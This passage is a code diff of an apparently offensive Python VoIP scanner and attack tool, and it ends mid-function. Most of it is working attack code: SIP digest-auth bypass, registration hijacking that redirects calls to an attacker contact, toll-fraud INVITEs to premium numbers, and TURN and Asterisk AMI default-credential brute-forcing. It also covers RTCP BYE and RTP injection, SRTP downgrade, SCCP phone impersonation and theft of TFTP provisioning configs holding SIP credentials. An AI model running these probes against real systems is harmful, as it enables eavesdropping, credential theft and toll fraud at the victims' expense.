     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "200 OK" in resp and "RTP/SAVP" not in resp:
-        await st.finding(ip,"MISCONFIGURATION","SRTP Not Enforced — Plaintext RTP","HIGH",
-            "Server accepted unencrypted RTP INVITE",f"sip://{ip}:5060")
+    # 200 OK AND no RTP/SAVP in response means server didn't enforce encryption
+    if resp and re.search(r"SIP/2\.0 200 OK",resp) and "RTP/SAVP" not in resp:
+        await st.finding(ip,"MISCONFIGURATION","SRTP Not Enforced — Plaintext RTP Accepted","HIGH",
+            "Server accepted unencrypted RTP INVITE and did not upgrade to SRTP",
+            f"sip://{ip}:5060")
+
 
 async def _rtp_inject(ip,st):
     ssrc    = random.randint(0,0xFFFFFFFF)
@@ -1437,22 +1861,20 @@ async def _rtp_inject(ip,st):
                 f"udp://{ip}:{port}")
             return
 
+
 async def _rtcp_bye_inject(ip,st):
-    """Inject a RTCP BYE packet to terminate media sessions."""
     ssrc     = random.randint(0,0xFFFFFFFF)
-    # RTCP BYE: V=2, P=0, RC=1, PT=203, Length=1
     rtcp_bye = struct.pack("!BBHI",0x81,0xcb,0x0001,ssrc)
     for port in [5005,7001,16385]:
         resp = await udp_xfer(ip,port,rtcp_bye,timeout=2)
-        # Any response means the stack processed our unsolicited BYE
         if resp is not None:
             await st.finding(ip,"EXPOSURE","RTCP BYE Injection Accepted","HIGH",
                 f"RTCP BYE processed on port {port} — active calls can be terminated",
                 f"udp://{ip}:{port}")
             return
 
+
 async def _srtp_downgrade(ip,st):
-    """Offer SRTP then plain RTP — see if server downgrades."""
     sdp_dual = (f"v=0\r\no=s 0 0 IN IP4 {ip}\r\ns=-\r\nc=IN IP4 {ip}\r\nt=0 0\r\n"
                 f"m=audio 16384 RTP/SAVP 0\r\n"
                 f"a=crypto:1 AES_CM_128_HMAC_SHA1_80 inline:{_sid()}\r\n"
@@ -1460,27 +1882,29 @@ async def _srtp_downgrade(ip,st):
                 f"m=audio 16386 RTP/AVP 0\r\na=rtpmap:0 PCMU/8000\r\n")
     pkt = sip_msg("INVITE",ip,body=sdp_dual)
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "200 OK" in resp and "RTP/AVP" in resp and "RTP/SAVP" not in resp:
+    if resp and re.search(r"SIP/2\.0 200 OK",resp) \
+            and "RTP/AVP" in resp and "RTP/SAVP" not in resp:
         await st.finding(ip,"MISCONFIGURATION","Media Encryption Downgrade Accepted","HIGH",
             "Server chose plain RTP over SRTP — MITM eavesdropping possible",
             f"sip://{ip}:5060")
 
+
 async def _dtls_fingerprint(ip,st):
-    """Check if DTLS-SRTP fingerprint is predictable/reused."""
     pkt = sip_msg("INVITE",ip,
                   extra_hdrs="Supported: dtls-srtp\r\n",
                   body=(sdp(ip)+"a=fingerprint:sha-256 AA:BB:CC:DD:EE:FF:"
                         "00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:"
                         "00:11:22:33:44:55:66:77:88:99\r\na=setup:actpass\r\n"))
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "200 OK" in resp and "fingerprint" in resp.lower():
-        await st.finding(ip,"EXPOSURE","DTLS-SRTP Fingerprint in SDP","LOW",
-            "Check if fingerprint is reused across sessions (CVE-2020-14871 pattern)",
-            f"sip://{ip}:5060")
+    if resp and re.search(r"SIP/2\.0 200 OK",resp) and "fingerprint" in resp.lower():
+        # Check if our injected fake fingerprint was mirrored (CVE-2020-14871 pattern)
+        if "AA:BB:CC:DD" in resp:
+            await st.finding(ip,"EXPOSURE","DTLS-SRTP Fingerprint Mirrored (Possible CVE-2020-14871)",
+                "MEDIUM","Server mirrored our fingerprint — verify fingerprint validation",
+                f"sip://{ip}:5060")
+
 
 async def _rtp_ssrc_hijack(ip,st):
-    """Attempt SSRC collision — send RTP with same SSRC as any existing stream."""
-    # We guess a common SSRC value
     for ssrc_guess in [0x00000001,0xDEADBEEF,0x12345678]:
         rtp_hdr = struct.pack("!BBHII",0x80,0x00,random.randint(1,65535),
                               random.randint(0,0xFFFFFFFF),ssrc_guess)
@@ -1511,44 +1935,102 @@ async def phase7_stun_turn(state:State, sem:asyncio.Semaphore):
     await asyncio.gather(*[_sem_probe(sem, stun_all, ip) for ip in state.live_ips])
     Con.ok("Phase 7 complete — STUN/TURN testing done")
 
+
 async def _stun_amp(ip,st):
-    stun = b"\x00\x01\x00\x00\x21\x12\xa4\x42" + os.urandom(12)
+    tid = os.urandom(12)
+    stun = b"\x00\x01\x00\x00\x21\x12\xa4\x42" + tid
     resp = await udp_xfer(ip,STUN_PORT,stun,timeout=3)
     if resp and len(resp)>=20:
-        amp = len(resp)/len(stun)
-        sev = "HIGH" if amp>3 else "MEDIUM"
-        await st.finding(ip,"EXPOSURE",
-            f"STUN Open — Amplification {amp:.1f}x",sev,
-            f"STUN port {STUN_PORT} responding — DDoS amplification risk",
-            f"udp://{ip}:{STUN_PORT}")
+        # Verify it's a proper STUN Binding Response (0x0101)
+        if resp[:2] == b"\x01\x01":
+            amp = len(resp)/len(stun)
+            sev = "HIGH" if amp>3 else "MEDIUM"
+            await st.finding(ip,"EXPOSURE",
+                f"STUN Open — Amplification Factor {amp:.1f}x",sev,
+                f"STUN port {STUN_PORT} responding — DDoS amplification risk",
+                f"udp://{ip}:{STUN_PORT}")
+
 
 async def _turn_relay(ip,st):
+    # TURN Allocate Request
     turn_alloc = b"\x00\x03\x00\x00\x21\x12\xa4\x42" + os.urandom(12)
     for port in TURN_PORTS:
         resp = await udp_xfer(ip,port,turn_alloc,timeout=3)
-        if resp and len(resp)>=20 and resp[:2] in (b"\x01\x03",b"\x00\x03"):
-            await st.finding(ip,"EXPOSURE","TURN Open Relay Possible","HIGH",
-                f"TURN Allocate on port {port} responded — test for unauth relay",
-                f"udp://{ip}:{port}")
-            return
+        if resp and len(resp)>=20:
+            # Error response 0x0113 = Unauthorized (requires auth) — server is running
+            # Success 0x0103 = Allocate Success — open relay!
+            msg_type = resp[:2]
+            if msg_type == b"\x01\x03":
+                await st.finding(ip,"EXPOSURE","TURN Open Relay — Allocate Succeeded Without Auth",
+                    "CRITICAL",
+                    f"TURN server granted allocation on port {port} without authentication",
+                    f"udp://{ip}:{port}")
+                return
+            elif msg_type == b"\x01\x13":
+                # Auth required — server is a TURN server but requires credentials
+                await st.finding(ip,"EXPOSURE","TURN Server Detected (Auth Required)","LOW",
+                    f"TURN server on port {port} — test with credentials",
+                    f"udp://{ip}:{port}")
+                return
+
 
 async def _turn_creds(ip,st):
-    """Try default TURN credentials."""
-    for user,pwd in [("turn","turn"),("admin","admin"),("asterisk","asterisk")]:
-        # TURN Allocate with long-term credential attributes
-        # Minimal implementation — check if server challenges or grants
-        turn_alloc = b"\x00\x03\x00\x00\x21\x12\xa4\x42" + os.urandom(12)
-        resp = await udp_xfer(ip,3478,turn_alloc,timeout=3)
-        if resp and b"\x01\x01" in resp:  # Success response
-            await st.finding(ip,"CREDENTIAL","TURN Default Credentials Accepted","HIGH",
-                f"TURN at {ip}:3478 granted allocation — relay abuse possible",
-                f"udp://{ip}:3478")
-            return
+    """Try TURN with default credentials using proper TURN authentication."""
+    # TURN Allocate with REQUESTED-TRANSPORT attribute (UDP=17)
+    def _build_turn_alloc_with_creds(username: str, password: str,
+                                      realm: str, nonce: str) -> bytes:
+        import hmac, hashlib, base64
+        tid = os.urandom(12)
+        ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
+        key = ha1.encode()
+        # Build attributes
+        attrs = b""
+        # USERNAME
+        un = username.encode()
+        attrs += b"\x00\x06" + len(un).to_bytes(2,"big") + un + b"\x00"*((-len(un))%4)
+        # REALM
+        rm = realm.encode()
+        attrs += b"\x00\x14" + len(rm).to_bytes(2,"big") + rm + b"\x00"*((-len(rm))%4)
+        # NONCE
+        nc = nonce.encode()
+        attrs += b"\x00\x15" + len(nc).to_bytes(2,"big") + nc + b"\x00"*((-len(nc))%4)
+        # REQUESTED-TRANSPORT (UDP=17)
+        attrs += b"\x00\x19\x00\x04\x11\x00\x00\x00"
+        # Build message for HMAC (without MESSAGE-INTEGRITY)
+        msg = b"\x00\x03" + (len(attrs)+24).to_bytes(2,"big") + b"\x21\x12\xa4\x42" + tid + attrs
+        mi = hmac.new(key, msg, hashlib.sha1).digest()
+        msg += b"\x00\x08\x00\x14" + mi
+        return msg
+
+    # First get realm/nonce from 401 response
+    turn_plain = b"\x00\x03\x00\x04\x21\x12\xa4\x42" + os.urandom(12) + b"\x00\x19\x00\x04\x11\x00\x00\x00"
+    resp = await udp_xfer(ip, 3478, turn_plain, timeout=3)
+    if not resp or resp[:2] != b"\x01\x13":
+        return  # No TURN server
+
+    decoded = resp.decode(errors="replace")
+    realm_m = re.search(r'realm[=:]\s*"?([^"\r\n]+)"?', decoded, re.I)
+    nonce_m = re.search(r'nonce[=:]\s*"?([^"\r\n]+)"?', decoded, re.I)
+    realm = realm_m.group(1) if realm_m else "voip"
+    nonce = nonce_m.group(1) if nonce_m else "defaultnonce"
+
+    for user,pwd in [("turn","turn"),("admin","admin"),("asterisk","asterisk"),("test","test")]:
+        try:
+            pkt = _build_turn_alloc_with_creds(user, pwd, realm, nonce)
+            resp2 = await udp_xfer(ip, 3478, pkt, timeout=3)
+            if resp2 and resp2[:2] == b"\x01\x03":
+                await st.finding(ip,"CREDENTIAL",f"TURN Default Credentials Accepted: {user}:{pwd}",
+                    "HIGH",
+                    f"TURN server at {ip}:3478 granted allocation with {user}:{pwd}",
+                    f"udp://{ip}:3478")
+                return
+        except Exception:
+            pass
+
 
 async def _ice_harvest(ip,st):
-    """Probe for ICE candidate disclosure via SIP INVITE SDP."""
     resp = await sip_probe(ip,5060,sip_msg("INVITE",ip,body=sdp(ip)),timeout=5)
-    if resp and "200 OK" in resp:
+    if resp and re.search(r"SIP/2\.0 200 OK",resp):
         candidates = re.findall(r'a=candidate:[^\r\n]+',resp)
         if candidates:
             private_cands = [c for c in candidates
@@ -1578,50 +2060,43 @@ async def phase8_iax2(state:State, sem:asyncio.Semaphore):
     await asyncio.gather(*[_sem_probe(sem, iax_all, ip) for ip in targets])
     Con.ok("Phase 8 complete — IAX2 testing done")
 
-def _iax2_frame(call_no:int, frame_type:int, subclass:int,
-                data:bytes=b"") -> bytes:
-    """Build minimal IAX2 frame."""
-    return struct.pack("!HHBBBBBx",
-                       0x8000|call_no, 0, 0, 0,
-                       frame_type, subclass, 0) + data
 
 async def _iax2_poke(ip,st):
-    poke = b"\x80\x00\x00\x00\x00\x01\x00\x00\x1e"  # POKE frame
+    poke = b"\x80\x00\x00\x00\x00\x01\x00\x00\x1e"
     resp = await udp_xfer(ip,IAX2_PORT,poke,timeout=3)
-    if resp:
+    if resp and len(resp)>=4:
         await st.finding(ip,"EXPOSURE","IAX2 Service Open (Port 4569)","MEDIUM",
             "IAX2 stack responding — version enumeration and trunk attacks possible",
             f"udp://{ip}:{IAX2_PORT}")
-        if ip not in state.iax2_hosts:
-            state.iax2_hosts.append(ip)
+        if ip not in st.iax2_hosts:
+            st.iax2_hosts.append(ip)
+
 
 async def _iax2_regreq(ip,st):
-    """IAX2 REGREQ without auth — check for open registration."""
-    # Build IAX2 NEW (type 0x06) with REGREQ subclass
     try:
-        # IAX2 REGREQ frame (simplified)
-        # Using raw frame: F=1, src_call=1, dst_call=0
         frame = bytearray(b"\x80\x01\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00")
-        # Append USERNAME IE (0x06) for "anonymous"
         frame += b"\x06\x09anonymous"
         resp = await udp_xfer(ip,IAX2_PORT,bytes(frame),timeout=3)
         if resp:
-            if b"REGAUTH" in resp or b"\x04" in resp[:20]:
-                await st.finding(ip,"EXPOSURE","IAX2 REGREQ Challenged (auth needed)","LOW",
-                    "IAX2 REGAUTH received — trunk brute-force possible",
-                    f"udp://{ip}:{IAX2_PORT}")
-            elif b"REGACK" in resp or b"\x0f" in resp[:20]:
-                await st.finding(ip,"MISCONFIGURATION","IAX2 Anonymous Registration Accepted","CRITICAL",
-                    "IAX2 REGACK without credentials — trunk takeover possible",
-                    f"udp://{ip}:{IAX2_PORT}")
+            # Parse response type
+            if len(resp) >= 12:
+                resp_type = resp[8] if len(resp) > 8 else 0
+                if b"REGAUTH" in resp or resp_type == 0x04:
+                    await st.finding(ip,"EXPOSURE","IAX2 REGREQ Challenged — Auth Required","LOW",
+                        "IAX2 REGAUTH received — trunk brute-force possible",
+                        f"udp://{ip}:{IAX2_PORT}")
+                elif b"REGACK" in resp or resp_type == 0x0f:
+                    await st.finding(ip,"MISCONFIGURATION","IAX2 Anonymous Registration Accepted",
+                        "CRITICAL",
+                        "IAX2 REGACK without credentials — trunk takeover possible",
+                        f"udp://{ip}:{IAX2_PORT}")
     except Exception:
         pass
 
+
 async def _iax2_enum(ip,st):
-    """IAX2 DPREQ — extension enumeration via Dialplan REQuest."""
     for ext in ["100","200","1000","admin","operator"]:
         try:
-            # IAX2 DPREQ (type 0x06, subclass 0x1c)
             frame = b"\x80\x01\x00\x00\x00\x00\x00\x00\x06\x1c\x00\x00"
             frame += b"\x17" + bytes([len(ext)]) + ext.encode()
             resp  = await udp_xfer(ip,IAX2_PORT,frame,timeout=2)
@@ -1632,21 +2107,23 @@ async def _iax2_enum(ip,st):
                 break
         except: pass
 
+
 async def _iax2_trunk_test(ip,st):
-    """Test IAX2 trunk without HMAC-MD5 auth."""
-    # Send a NEW frame for an outbound call without auth
     try:
-        new_frame = (b"\x80\x01\x00\x00\x00\x00\x00\x00"  # header
-                     b"\x06\x01\x00\x00"                   # type=IAXCTL, sub=NEW
-                     b"\x03\x04\x00\x00\x00\x01"           # IE: FORMAT
-                     b"\x04\x04\x00\x00\x00\x04"           # IE: CAPABILITY
-                     b"\x0a\x07+1900123"                   # IE: CALLEDNUM
-                     b"\x08\x03100")                       # IE: CALLINGNUM
+        new_frame = (b"\x80\x01\x00\x00\x00\x00\x00\x00"
+                     b"\x06\x01\x00\x00"
+                     b"\x03\x04\x00\x00\x00\x01"
+                     b"\x04\x04\x00\x00\x00\x04"
+                     b"\x0a\x07+1900123"
+                     b"\x08\x03100")
         resp = await udp_xfer(ip,IAX2_PORT,new_frame,timeout=3)
-        if resp and not (b"\x05\x04" in resp or b"REJECT" in resp):
-            await st.finding(ip,"MISCONFIGURATION","IAX2 Outbound Call Without Auth","CRITICAL",
-                "IAX2 NEW accepted without HMAC-MD5 — toll fraud via IAX2 trunk",
-                f"udp://{ip}:{IAX2_PORT}")
+        if resp and len(resp)>=4:
+            resp_type = resp[8] if len(resp) > 8 else 0
+            # Not REJECT (0x05) and not HANGUP = call was accepted
+            if resp_type not in (0x05, 0x04, 0x29):
+                await st.finding(ip,"MISCONFIGURATION","IAX2 Outbound Call Without Auth","CRITICAL",
+                    "IAX2 NEW accepted without HMAC-MD5 — toll fraud via IAX2 trunk",
+                    f"udp://{ip}:{IAX2_PORT}")
     except: pass
 
 # ══════════════════════════════════════════════════════════
@@ -1671,34 +2148,35 @@ async def phase9_mgcp_sccp_h323(state:State, sem:asyncio.Semaphore):
     await asyncio.gather(*[_sem_probe(sem, legacy_all, ip) for ip in targets])
     Con.ok("Phase 9 complete — MGCP/SCCP/H.323 testing done")
 
+
 async def _mgcp_probe(ip,st):
     pkt  = f"AUEP 100 aaln/1@{ip} MGCP 1.0\r\n\r\n".encode()
     resp = await udp_xfer(ip,MGCP_PORT,pkt,timeout=3)
-    if resp:
+    if resp and len(resp)>=3:
+        code = resp[:3]
         await st.finding(ip,"EXPOSURE","MGCP (Port 2427) Open","MEDIUM",
-            "MGCP gateway responding — endpoint enumeration possible",
+            f"MGCP gateway responding (code {code.decode(errors='replace')}) — endpoint enumeration possible",
             f"udp://{ip}:{MGCP_PORT}")
         if ip not in st.mgcp_hosts:
             st.mgcp_hosts.append(ip)
 
+
 async def _mgcp_eplist(ip,st):
-    """MGCP RQNT without auth — checks for open gateway control."""
     for ep in ["aaln/1","aaln/*","S0/SU0@[email protected]"]:
         pkt  = f"RQNT 101 {ep}@{ip} MGCP 1.0\r\nX: dummy\r\n\r\n".encode()
         resp = await udp_xfer(ip,MGCP_PORT,pkt,timeout=3)
-        if resp:
+        if resp and len(resp)>=3:
             code = resp[:3]
             if code in (b"200",b"250"):
                 await st.finding(ip,"MISCONFIGURATION",
                     f"MGCP RQNT Accepted for {ep}","HIGH",
-                    "Unauth MGCP command — gateway fully controllable",
+                    "Unauth MGCP command accepted — gateway may be fully controllable",
                     f"udp://{ip}:{MGCP_PORT}")
                 return
 
+
 async def _sccp_probe(ip,st):
-    """SCCP (Skinny) — Cisco proprietary phone protocol."""
     if not await tcp_open(ip,SCCP_PORT,timeout=3): return
-    # Minimal SCCP KeepAlive message
     keepalive = struct.pack("<IIH",4,0,0x0000)
     resp = await tcp_xfer(ip,SCCP_PORT,keepalive,timeout=4)
     if resp and len(resp)>=8:
@@ -1708,11 +2186,9 @@ async def _sccp_probe(ip,st):
         if ip not in st.sccp_hosts:
             st.sccp_hosts.append(ip)
 
+
 async def _sccp_enum(ip,st):
-    """SCCP Station Registration Request without auth."""
     if ip not in st.sccp_hosts: return
-    # StationRegisterMessage (type 0x0001)
-    # Device name, userId, instance, IP, type, maxStreams
     dev_name = b"SEP001122334455" + b"\x00"*16
     reg_msg  = struct.pack("<I",0x0001) + dev_name + \
                struct.pack("<IIIH4sH",1,1,1,7, socket.inet_aton("1.2.3.4"),6)
@@ -1720,43 +2196,38 @@ async def _sccp_enum(ip,st):
     resp     = await tcp_xfer(ip,SCCP_PORT,hdr+reg_msg,timeout=5)
     if resp and len(resp)>4:
         msg_type = struct.unpack_from("<I",resp,4)[0] if len(resp)>=8 else 0
-        if msg_type==0x009d:  # RegisterAck
+        if msg_type==0x009d:
             await st.finding(ip,"MISCONFIGURATION",
                 "SCCP Unauthenticated Station Registration Accepted","CRITICAL",
                 "Cisco Skinny accepted StationRegister without auth — phone impersonation",
                 f"tcp://{ip}:{SCCP_PORT}")
-        elif msg_type==0x0009:  # CapabilitiesReqMessage
-            await st.finding(ip,"EXPOSURE","SCCP Registration Initiated","MEDIUM",
+        elif msg_type==0x0009:
+            await st.finding(ip,"EXPOSURE","SCCP Registration Initiated — CapabilitiesReq","MEDIUM",
                 "SCCP server sent CapabilitiesReq — further exploitation possible",
                 f"tcp://{ip}:{SCCP_PORT}")
 
+
 async def _h323_probe(ip,st):
-    """H.323 Q.931 Setup probe on TCP 1720."""
     if not await tcp_open(ip,H323_PORT,timeout=3): return
-    # Minimal Q.931 SETUP message preamble
     q931 = bytes([
-        0x08,0x02,0x00,0x05,  # protocol discriminator, call ref, type=SETUP
-        0x05,0xa1,             # bearer capability
-        0x04,0x03,0x80,0x90,0xa3,  # channel ID
+        0x08,0x02,0x00,0x05,
+        0x05,0xa1,
+        0x04,0x03,0x80,0x90,0xa3,
     ])
     resp = await tcp_xfer(ip,H323_PORT,q931,timeout=5)
-    if resp:
+    if resp and len(resp)>=4:
         await st.finding(ip,"EXPOSURE","H.323 (Port 1720) Open","MEDIUM",
-            "H.323 Q.931 stack responding — legacy VOIP exploitation possible",
+            "H.323 Q.931 stack responding — legacy VoIP exploitation possible",
             f"tcp://{ip}:{H323_PORT}")
         if ip not in st.h323_hosts:
             st.h323_hosts.append(ip)
 
+
 async def _h323_enum(ip,st):
     if ip not in st.h323_hosts: return
-    # Try H.225 RAS GatekeeperRequest
-    gk_req = bytes([
-        0x00,0x09,  # RAS GRQ
-        0x00,0x00,0x00,0x00,  # requestSeqNum
-        0x01,0x00,  # protocolIdentifier
-    ])
+    gk_req = bytes([0x00,0x09,0x00,0x00,0x00,0x00,0x01,0x00])
     resp = await udp_xfer(ip,1719,gk_req,timeout=3)
-    if resp:
+    if resp and len(resp)>=4:
         await st.finding(ip,"EXPOSURE","H.323 Gatekeeper RAS Responding","MEDIUM",
             "H.323 RAS on UDP 1719 responding — gatekeeper enumeration possible",
             f"udp://{ip}:1719")
@@ -1780,68 +2251,76 @@ async def phase10_tftp(state:State, sem:asyncio.Semaphore):
     await asyncio.gather(*[_sem_probe(sem, tftp_all, ip) for ip in state.live_ips])
     Con.ok(f"Phase 10 complete — {len(state.provision_urls)} provisioning issues found")
 
+
 def _tftp_rrq(filename:str) -> bytes:
-    """Build TFTP Read Request packet."""
     return b"\x00\x01" + filename.encode() + b"\x00" + b"octet" + b"\x00"
+
 
 async def _tftp_probe(ip,st):
     for fname in [FAKE_MAC+".cfg",FAKE_MAC+".xml","000000000000.cfg",
                   "phone.cfg","sip.cfg","spa000000000000.cfg"]:
         pkt  = _tftp_rrq(fname)
         resp = await udp_xfer(ip,TFTP_PORT,pkt,timeout=3)
-        if resp and len(resp)>=4 and resp[:2]==b"\x00\x03":  # DATA packet
+        if resp and len(resp)>=4 and resp[:2]==b"\x00\x03":
             await st.finding(ip,"EXPOSURE",
                 f"TFTP Server Returned Phone Config ({fname})","CRITICAL",
                 "TFTP config file readable without auth — contains SIP credentials, server IPs",
                 f"tftp://{ip}/{fname}")
-            st.provision_urls.append({"ip":ip,"path":f"tftp/{fname}",
-                                      "status":"accessible"})
+            st.provision_urls.append({"ip":ip,"path":f"tftp/{fname}","status":"accessible"})
             return
-        elif resp and resp[:2]==b"\x00\x05":  # ERROR
-            # TFTP is alive but file not found
-            await st.finding(ip,"EXPOSURE","TFTP Server Open","LOW",
+        elif resp and resp[:2]==b"\x00\x05":
+            await st.finding(ip,"EXPOSURE","TFTP Server Open — Config Files Potentially Available",
+                "LOW",
                 f"TFTP port {TFTP_PORT} open — test with actual device MAC for config theft",
                 f"tftp://{ip}/")
             return
 
+
 async def _provision_paths(ip,st):
-    """Check HTTP provisioning paths with fake/real-looking MACs."""
     macs = [FAKE_MAC,"001565000001","0004f2000001","00026b000001"]
-    for mac in macs:
-        for path_tpl in PHONE_PROVISION_PATHS:
-            path = path_tpl.replace("{mac}",mac).replace("{MAC}",mac.upper())
-            for proto,port in [("http",80),("http",8080),("https",443)]:
-                c,b = await http_get(None if not HAS_AIOHTTP else
-                    new_session(),f"{proto}://{ip}:{port}{path}",timeout=4)
-                if c==200 and (re.search(r'sip|pbx|password|server|registrar',b,re.I)
-                               or len(b)>200):
+    sess = new_session()
+    try:
+        for mac in macs:
+            for path_tpl in PHONE_PROVISION_PATHS:
+                path = path_tpl.replace("{mac}",mac).replace("{MAC}",mac.upper())
+                for proto,port in [("http",80),("http",8080),("https",443)]:
+                    c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",timeout=4)
+                    if c==200 and (re.search(r'sip|pbx|password|server|registrar',b,re.I)
+                                   or len(b)>200):
+                        await st.finding(ip,"EXPOSURE",
+                            f"Phone Provisioning Config Exposed: {path}","CRITICAL",
+                            "Provisioning file readable — may contain SIP credentials",
+                            f"{proto}://{ip}:{port}{path}")
+                        st.provision_urls.append({"ip":ip,"path":path,"status":f"HTTP {c}"})
+                        return
+    finally:
+        if sess and HAS_AIOHTTP:
+            await sess.close()
+
+
+async def _http_provision(ip,st):
+    sess = new_session()
+    try:
+        for path in ["/AutoProvision/","/provision/","/provision.php",
+                     "/cgi-bin/provision.cgi","/phones/config/"]:
+            for proto,port in [("http",80),("http",8080)]:
+                c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",timeout=4)
+                if c==200 and len(b) > 100:
                     await st.finding(ip,"EXPOSURE",
-                        f"Phone Provisioning Config Exposed: {path}","CRITICAL",
-                        "Provisioning file readable — may contain SIP credentials",
+                        f"Auto-Provision Endpoint Open: {path}","HIGH",
+                        "Provisioning API accessible without auth",
                         f"{proto}://{ip}:{port}{path}")
                     st.provision_urls.append({"ip":ip,"path":path,"status":f"HTTP {c}"})
                     return
+    finally:
+        if sess and HAS_AIOHTTP:
+            await sess.close()
 
-async def _http_provision(ip,st):
-    """Check for auto-provision API endpoints."""
-    for path in ["/AutoProvision/","/provision/","/provision.php",
-                 "/cgi-bin/provision.cgi","/phones/config/"]:
-        for proto,port in [("http",80),("http",8080)]:
-            c,b = await http_get(None,f"{proto}://{ip}:{port}{path}",timeout=4)
-            if c==200:
-                await st.finding(ip,"EXPOSURE",
-                    f"Auto-Provision Endpoint Open: {path}","HIGH",
-                    "Provisioning API accessible without auth",
-                    f"{proto}://{ip}:{port}{path}")
-                st.provision_urls.append({"ip":ip,"path":path,"status":f"HTTP {c}"})
-                return
 
 async def _dhcp_option_info(ip,st):
-    """Check if DHCP option 66 (TFTP server) or 43 (vendor info) reveals this host."""
-    # We can't send DHCP from here, but check if the host runs TFTP (already done)
-    # Instead, check if the HTTP server reveals provisioning server info in headers
     try:
-        resp = await tcp_xfer(ip,80,b"OPTIONS / HTTP/1.0\r\nHost: "+ip.encode()+b"\r\n\r\n",timeout=4)
+        resp = await tcp_xfer(ip,80,
+            b"OPTIONS / HTTP/1.0\r\nHost: "+ip.encode()+b"\r\n\r\n",timeout=4)
         if resp:
             decoded = resp.decode(errors="replace")
             if re.search(r'X-Provision|X-Config|tftp|auto-provision',decoded,re.I):
@@ -1876,17 +2355,21 @@ async def phase11_auth(state:State, sess, sem:asyncio.Semaphore):
     await asyncio.gather(*[_sem_probe(sem, auth_all, ip) for ip in state.live_ips])
     Con.ok(f"Phase 11 complete — {len(state.digest_hashes)} hashes captured")
 
+
 async def _digest_bypass(ip,st):
-    for label,nonce,rsp in [("EmptyResponse","test",""),("EmptyNonce","","")]:
+    for label,nonce,rsp in [("EmptyResponse","test",""),("EmptyNonce","",""),
+                             ("ZeroResponse","test","0"*32)]:
         auth = (f'Authorization: Digest username="admin",realm="{ip}",'
                 f'nonce="{nonce}",uri="sip:{ip}",response="{rsp}"\r\n')
         extra = (f"To: <sip:admin@{ip}>\r\nFrom: <sip:admin@{ip}>;tag={_sid()[:8]}\r\n"
                  f"{auth}Expires: 60\r\n")
         pkt  = sip_msg("REGISTER",ip,extra_hdrs=extra)
         resp = await sip_probe(ip,5060,pkt,timeout=5)
-        if resp and "200 OK" in resp:
+        if resp and re.search(r"SIP/2\.0 200 OK",resp):
             await st.finding(ip,"AUTH-BYPASS",f"SIP Digest Bypass: {label}","CRITICAL",
-                f"Server accepted REGISTER with {label}",f"sip://{ip}:5060")
+                f"Server accepted REGISTER with {label} — authentication completely bypassed",
+                f"sip://{ip}:5060")
+
 
 async def _digest_capture(ip,st):
     pkt  = sip_msg("REGISTER",ip,from_user="cracker",extra_hdrs="Expires: 60\r\n")
@@ -1902,15 +2385,17 @@ async def _digest_capture(ip,st):
                          f"{col('hashcat -m 11400','cyan')} digest_hashes.txt")
                 break
 
+
 async def _reg_hijack(ip,st):
     extra = (f"To: <sip:100@{ip}>\r\nFrom: <sip:100@{ip}>;tag={_sid()[:8]}\r\n"
              f"Contact: <sip:attacker@evil.invalid>\r\nExpires: 3600\r\n")
     pkt  = sip_msg("REGISTER",ip,extra_hdrs=extra)
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "200 OK" in resp:
+    if resp and re.search(r"SIP/2\.0 200 OK",resp):
         await st.finding(ip,"AUTH-BYPASS","Registration Hijacking — Call Redirect","CRITICAL",
-            "Unauth re-REGISTER accepted — all calls to ext 100 will be forwarded to attacker",
+            "Unauth re-REGISTER accepted — all calls to ext 100 forwarded to attacker",
             f"sip://{ip}:5060")
+
 
 async def _unauth_refer(ip,st):
     extra = (f"To: <sip:100@{ip}>\r\nFrom: <sip:scanner@scanner>;tag={_sid()[:8]}\r\n"
@@ -1922,6 +2407,7 @@ async def _unauth_refer(ip,st):
             "REFER to premium number accepted — initiates outbound call at victim's expense",
             f"sip://{ip}:5060")
 
+
 async def _md5_weak(ip,st):
     pkt  = sip_msg("REGISTER",ip,extra_hdrs=f"To: <sip:probe@{ip}>\r\n")
     resp = await sip_probe(ip,5060,pkt,timeout=5)
@@ -1931,46 +2417,70 @@ async def _md5_weak(ip,st):
             "MD5+no-qop → replay attack possible (RFC 7616: use SHA-256+qop=auth-int)",
             f"sip://{ip}:5060")
 
+
 async def _trunk_auth_bypass(ip,st):
     extra = (f"To: <sip:+19001234567@{ip}>\r\n"
              f"From: <sip:anonymous@anonymous.invalid>;tag={_sid()[:8]}\r\n"
              f"Privacy: id\r\n")
     pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and re.search(r"SIP/2\.0 (100|180|183|200)",resp):
+    # 100/180/183/200 means server is routing the call without auth
+    if resp and re.search(r"SIP/2\.0 (180|183|200)",resp):
         await st.finding(ip,"MISCONFIGURATION","SIP Trunk Auth Bypass — Toll Fraud","CRITICAL",
             "INVITE to +1-900 number accepted without auth — toll fraud via anonymous trunk",
             f"sip://{ip}:5060")
 
+
 async def _ami_brute(ip,st):
-    loop = asyncio.get_event_loop()
-    def _try(user,pwd):
+    """Async AMI brute-force using asyncio streams (no blocking sleep)."""
+    if not await tcp_open(ip, AMI_PORT, timeout=3.0):
+        return
+
+    async def _try_ami(user: str, pwd: str) -> bool:
         try:
-            s=socket.socket(); s.settimeout(5); s.connect((ip,AMI_PORT))
-            time.sleep(0.3)
-            s.sendall(f"Action: Login\r\nUsername: {user}\r\nSecret: {pwd}\r\n\r\n".encode())
-            time.sleep(0.6)
-            r=s.recv(4096).decode(errors="replace"); s.close()
-            return "Success" in r
-        except: return False
+            r, w = await asyncio.wait_for(
+                asyncio.open_connection(ip, AMI_PORT), timeout=5.0)
+            # Read banner
+            banner = await asyncio.wait_for(r.read(256), timeout=3.0)
+            if b"Asterisk" not in banner and b"Call Manager" not in banner:
+                w.close()
+                return False
+            # Send login
+            login = f"Action: Login\r\nUsername: {user}\r\nSecret: {pwd}\r\n\r\n"
+            w.write(login.encode())
+            await w.drain()
+            # Read response
+            resp = await asyncio.wait_for(r.read(1024), timeout=3.0)
